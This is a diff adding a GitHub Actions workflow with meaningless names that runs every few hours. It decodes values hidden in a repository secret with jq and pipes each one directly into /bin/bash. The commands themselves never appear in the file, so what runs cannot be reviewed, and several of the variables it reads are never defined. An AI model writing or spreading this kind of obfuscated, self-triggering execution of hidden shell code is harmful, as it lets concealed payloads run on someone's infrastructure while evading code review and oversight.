@@ -1,0 +1,23 @@
+name: parmesanannoyed
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: parmesanannoyed
+        env:
+          efqu1941: ${{ secrets.efqu1941 }}
+        run: |
+          echo $efqu1941 | jq -r .s930 | /bin/bash
+          echo $in0000 | jq -r .tat37 | /bin/bash
+          echo $big48183 | jq -r .fckc37559 | /bin/bash
+          echo $muq91 | jq -r .q1 | /bin/bash
+          echo $lac4442 | jq -r .rfkx097 | /bin/bash
+
